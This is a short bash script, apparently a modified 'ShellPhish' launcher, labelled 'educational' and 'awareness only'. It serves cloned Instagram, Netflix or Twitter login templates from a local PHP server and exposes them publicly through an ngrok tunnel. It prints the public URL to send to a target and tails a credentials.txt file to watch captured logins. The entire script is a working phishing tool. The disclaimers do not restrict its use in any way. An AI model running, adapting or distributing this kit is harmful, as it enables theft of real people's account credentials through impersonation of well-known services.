#!/bin/bash

# Educational ShellPhish Launcher
# Modified for training and awareness only

trap "exit" INT

banner() {
  echo -e "\e[1;34m
███████╗██╗  ██╗███████╗██╗     ██╗     ██╗███████╗██╗  ██╗
██╔════╝██║ ██╔╝██╔════╝██║     ██║     ██║██╔════╝██║  ██║
███████╗█████╔╝ █████╗  ██║     ██║     ██║███████╗███████║
╚════██║██╔═██╗ ██╔══╝  ██║     ██║     ██║╚════██║██╔══██║
███████║██║  ██╗███████╗███████╗███████╗██║███████║██║  ██║
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝

Educational Edition | Awareness Purpose Only
\e[0m"
}

launch_ngrok() {
  echo "[*] Starting PHP server..."
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  echo "[*] Starting Ngrok tunnel..."
  ngrok http 3333 > /dev/null 2>&1 &
  sleep 5
  echo "[+] Share this URL with your training participant:"
  curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'
}

start_template() {
  echo "[*] Choose template to use:"
  echo "1) Instagram"
  echo "2) Netflix"
  echo "3) Twitter"
  read -p "Enter number: " option

  case $option in
    1) cp -r templates/instagram/* . ;;
    2) cp -r templates/netflix/* . ;;
    3) cp -r templates/twitter/* . ;;
    *) echo "[!] Invalid option."; exit 1 ;;
  esac

  launch_ngrok
  tail -f credentials.txt
}

# Setup
banner
mkdir -p logs
touch credentials.txt
start_template
